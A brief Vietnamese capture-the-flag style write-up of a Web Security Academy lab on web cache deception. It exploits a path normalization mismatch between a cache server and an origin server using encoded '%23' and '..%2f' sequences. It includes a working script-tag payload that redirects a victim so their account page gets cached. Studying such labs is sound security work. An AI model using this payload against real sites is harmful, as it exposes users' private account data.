![image](https://github.com/user-attachments/assets/397edc23-3dbf-4e41-b6e7-270f632fc84a)

Ở challenge này cũng là chuẩn hóa nhưng mà ở cache server chứ ko phải origin server.

# So sánh xử lý URL giữa Origin Server và Cache Server

| URL                              | Hành vi của Origin Server                                        | Kết quả          |
|----------------------------------|------------------------------------------------------------------|------------------|
| `/my-account/..%2fresources`     | Chuẩn hóa thành `/resources`, dẫn đến `404 Not Found` nếu tài nguyên không tồn tại. | Không thành công |
| `/my-account%23/..%2fresources`  | `%23` được giữ nguyên, không chuẩn hóa như fragment. Cache server và origin server xử lý `/resources`. | Thành công       |

![image](https://github.com/user-attachments/assets/bbcfffd5-a9af-452f-bd6e-3b4abb876d52)

Tiến hành check thử thì phát hiện path /resources là nơi nó sẽ cache

+ ? được server hiểu là query string, thường không được cache để tránh rủi ro lưu trữ nội dung động.

+ %23 được xử lý như một phần hợp lệ của path (không phải fragment), làm cho cache server dễ dàng lưu trữ nội dung theo quy tắc cache dành cho tài nguyên tĩnh.

Nên payload của chúng ta sẽ lợi dụng điều này để khai thác

```
<script>document.location="https://0aa000560420cfd7809d26fc00150018.web-security-academy.net/my-account%23/%2e%2e%2fresources"</script>
```

Và thành công 

![image](https://github.com/user-attachments/assets/4cbf59ef-f838-4c90-bbf6-949e26e9e338)
